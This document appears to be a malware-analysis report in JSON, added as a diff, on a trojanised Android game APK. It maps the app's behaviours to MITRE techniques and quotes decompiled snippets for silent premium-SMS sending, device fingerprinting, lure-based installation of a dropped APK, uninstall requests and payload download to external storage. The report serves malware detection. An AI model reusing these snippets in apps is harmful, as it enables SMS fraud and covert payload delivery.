@@ -1,0 +1,172 @@
+{
+  "APK信息": {
+    "文件名": "1cd44974c02bb0e758f8bb607c62939c1454e36c9205afc4c4865d9b32fd18b8.apk",
+    "sha256": "1cd44974c02bb0e758f8bb607c62939c1454e36c9205afc4c4865d9b32fd18b8",
+    "包名": "com.tgame.maria",
+    "应用名": "Super maria journey",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 585.4
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\riverjump\\porio\\PorioActivity;",
+          "method_signature": "switch(getResultCode()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager manager = SmsManager.getDefault();\nmanager.sendTextMessage(number, null, textMessage, sentPI, deliveredPI);\n\nprotected void handleResult(String string) {\n    if (string.equalsIgnoreCase(SUCCESS)) {\n        int totalLife = SavedGame.getInstance(this).getCurrentTotalLife();\n        if (this.smsLoading.getType() == 0) {\n            totalLife += 10;\n        }\n        SavedGame.getInstance(this).saveTotalLife(totalLife);",
+          "malicious_code_snippet_context": "                  }\n              }\n          }, new IntentFilter(this.SENT));\n>>>         SmsManager manager = SmsManager.getDefault();\n>>>         manager.sendTextMessage(number, null, textMessage, sentPI, deliveredPI);\n>>>     }\n>>> \n>>>     protected void handleResult(String string) {\n>>>         if (string.equalsIgnoreCase(SUCCESS)) {\n>>>             int totalLife = SavedGame.getInstance(this).getCurrentTotalLife();\n>>>             if (this.smsLoading.getType() == 0) {\n>>>                 totalLife += 10;\n>>>             }\n              SavedGame.getInstance(this).saveTotalLife(totalLife);\n              SavedGame.getInstance(this).activate();\n          }",
+          "behavior_description": "该代码在游戏 Activity 中通过 SmsManager.sendTextMessage() 静默发送短信（未调起系统短信UI，无用户可见确认），并通过 BroadcastReceiver 监听发送结果（switch(getResultCode()) 处理 RESULT_ERROR_NULL_PDU、RESULT_ERROR_NO_SERVICE 等状态）。短信发送成功后，handleResult() 回调为游戏增加 10 点生命值（totalLife += 10）并激活游戏。数据流向：number（目标号码）和 textMessage（短信内容，通常为硬编码的增值业务订阅指令或远程下发的付费号码）→ SmsManager.sendTextMessage() 静默发送。这是典型的增值短信欺诈模式：以游戏奖励（生命值）为诱饵，诱导或静默向付费号码发送订阅短信，直接造成用户话费损失。结合 ESET 报告确认该样本为捆绑恶意载荷的木马化游戏，此短信发送行为构成明确的短信欺诈。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "getDeviceId",
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\ads\\util\\AdUtil;",
+          "method_signature": "if(c == null)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "String string = Settings.Secure.getString(context.getContentResolver(), \"android_id\");\nif (string == null || c()) {\n    strB = b(\"emulator\");\n} else {\n    strB = b(string);\n}\nc = strB.toUpperCase(Locale.US);",
+          "malicious_code_snippet_context": "      public static String a(Context context) {\n          String strB;\n          if (c == null) {\n>>>             String string = Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>             if (string == null || c()) {\n>>>                 strB = b(\"emulator\");\n>>>             } else {\n>>>                 strB = b(string);\n>>>             }\n>>>             if (strB == null) {\n                  return null;\n              }\n              c = strB.toUpperCase(Locale.US);",
+          "behavior_description": "该代码位于Google AdMob广告SDK（com.google.ads.util.AdUtil）中，用于生成设备唯一标识符（UDID）。代码通过Settings.Secure.getString读取系统ANDROID_ID作为数据来源；若读取失败或检测到模拟器环境（c()方法返回真），则以'emulator'字符串替代；随后对标识符进行哈希运算（b()方法，通常为MD5）并转为大写后缓存到静态变量c中，构建持久化设备指纹，供广告SDK进行设备识别与追踪。数据流向：Settings.Secure（ANDROID_ID）→ 哈希处理 → 静态变量缓存（设备指纹生成，后续随广告请求上报）。该行为属于广告SDK在用户无感知情况下进行的隐蔽设备指纹采集，虽为AdMob标准功能、未见本片段中直接恶意外传，但构成对设备标识的过度收集。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\systemservice\\sdk\\Utils;",
+          "method_signature": "setupLauchesIcon(Context context, String filePath, int resIconId, String title)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent1 = new Intent(\"android.intent.action.VIEW\");\nintent1.setDataAndType(Uri.fromFile(new File(filePath)), \"application/vnd.android.package-archive\");\nIntent intent2 = new Intent();\nintent2.putExtra(\"android.intent.extra.shortcut.INTENT\", intent1);\nintent2.putExtra(\"android.intent.extra.shortcut.NAME\", title);\nintent2.setAction(\"com.android.launcher.action.INSTALL_SHORTCUT\");\ncontext.sendBroadcast(intent2);",
+          "malicious_code_snippet_context": "  \n      public static void setupLauchesIcon(Context context, String filePath, int resIconId, String title) {\n          try {\n>>>             Intent intent1 = new Intent(\"android.intent.action.VIEW\");\n>>>             intent1.setDataAndType(Uri.fromFile(new File(filePath)), \"application/vnd.android.package-archive\");\n>>>             Intent intent2 = new Intent();\n>>>             intent2.putExtra(\"android.intent.extra.shortcut.INTENT\", intent1);\n>>>             intent2.putExtra(\"android.intent.extra.shortcut.NAME\", title);\n>>>             intent2.putExtra(\"android.intent.extra.shortcut.ICON_RESOURCE\", Intent.ShortcutIconResource.fromContext(context, resIconId));\n>>>             intent2.setAction(\"com.android.launcher.action.INSTALL_SHORTCUT\");\n              context.sendBroadcast(intent2);\n          } catch (Exception e) {\n              e.printStackTrace();",
+          "behavior_description": "该代码通过发送com.android.launcher.action.INSTALL_SHORTCUT广播在用户桌面创建快捷方式，快捷方式绑定的Intent指向本地APK文件（MIME类型application/vnd.android.package-archive）。用户点击该图标后会调起系统包安装器，诱导用户安装木马释放到本地的捆绑恶意APK（对应ESET报告中游戏外壳捆绑systemdata/resourcea的dropper行为，类路径com.systemservice.sdk也印证其为恶意SDK而非正常业务）。数据流向：外部传入的filePath（恶意释放的APK文件路径）→ 构造VIEW安装Intent → 桌面快捷方式 → 系统安装器。虽非完全静默安装（需用户点击图标并确认安装），但作为已确认恶意dropper样本诱导安装第二阶段载荷的核心社会工程手段，属于恶意行为。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\systemservice\\sdk\\Utils;",
+          "method_signature": "uninstallApp(Context context, String packageName)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.DELETE\");\nintent.setFlags(268435456);\nintent.setData(Uri.parse(\"package:\" + packageName));\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "  \n      public static void uninstallApp(Context context, String packageName) {\n          try {\n>>>             Intent intent = new Intent(\"android.intent.action.DELETE\");\n>>>             intent.setFlags(268435456);\n>>>             intent.setData(Uri.parse(\"package:\" + packageName));\n>>>             context.startActivity(intent);\n          } catch (Exception e) {\n              e.printStackTrace();\n          }",
+          "behavior_description": "该代码位于木马自身携带的sdk工具类(com.systemservice.sdk.Utils)中，与ESET报告所述捆绑释放的systemdata/resourcea子包命名特征吻合。uninstallApp方法通过构造ACTION_DELETE类型的Intent，并设置'package:'+packageName的URI数据，调用startActivity对指定包名的应用发起卸载请求。数据流向：由木马逻辑传入的目标应用包名packageName(source)→startActivity触发系统应用卸载流程(sink)。同类的相邻代码还包含通过setDataAndType('application/vnd.android.package-archive')安装本地APK的功能，构成'释放安装恶意子包→卸载原始应用'的完整Dropper攻击链，典型用途是在安装恶意负载后卸载原始游戏应用以消除痕迹，或诱导卸载安全软件。由于ACTION_DELETE会弹出系统确认对话框（非完全静默），实际卸载需用户确认才完成，故风险等级为中。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\systemservice\\sdk\\DownloadFileAsyn;",
+          "method_signature": "DownloadFileAsyn(Context context, String url, String _title)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public DownloadFileAsyn(Context context, String url, String _title) {\n    this.mFileUrl = url;\n    this.filePath = Environment.getExternalStorageDirectory().getAbsolutePath();\n    this.filePath = String.valueOf(this.filePath) + \"/\" + _title;\n}\n\npublic void executeSetupIcon(String _title) {\n    this.task = finalTask.SETUP_LAUNCHES_ICON;\n    this.filePath = Environment.getExternalStorageDirectory().getAbsolutePath();\n    this.filePath = String.valueOf(this.filePath) + \"/\" + _title;\n    execute(\"\");\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public DownloadFileAsyn(Context context, String url, String _title) {\n>>>         this.mContext = context;\n>>>         this.mFileUrl = url;\n>>>         this.filePath = Environment.getExternalStorageDirectory().getAbsolutePath();\n>>>         this.filePath = String.valueOf(this.filePath) + \"/\" + _title;\n>>>         this.title = _title;\n>>>     }\n>>> \n>>>     public void executeSetupIcon(String _title) {\n>>>         this.task = finalTask.SETUP_LAUNCHES_ICON;\n>>>         this.filePath = Environment.getExternalStorageDirectory().getAbsolutePath();\n>>>         this.filePath = String.valueOf(this.filePath) + \"/\" + _title;\n          this.title = _title;\n          execute(\"\");\n      }",
+          "behavior_description": "该代码位于木马释放器（dropper）组件 DownloadFileAsyn 中。构造函数接收远程服务器 URL（mFileUrl），并将下载文件的落盘路径设置为外部存储根目录（Environment.getExternalStorageDirectory()）下以指定标题命名的文件，随后通过 execute() 异步从远程 URL 下载文件写入外部存储；executeSetupIcon 还会执行 SETUP_LAUNCHES_ICON 任务，疑似在释放新组件后修改/隐藏自身启动器图标以实现隐蔽。结合 ESET 报告确认该样本为伪装成游戏、捆绑释放额外恶意应用（systemdata/resourcea）的木马，此代码正是其载荷投递机制：从远程服务器下载附加 APK 到外部存储，为后续诱导/静默安装恶意载荷做准备，属于典型的恶意文件写入与载荷释放行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
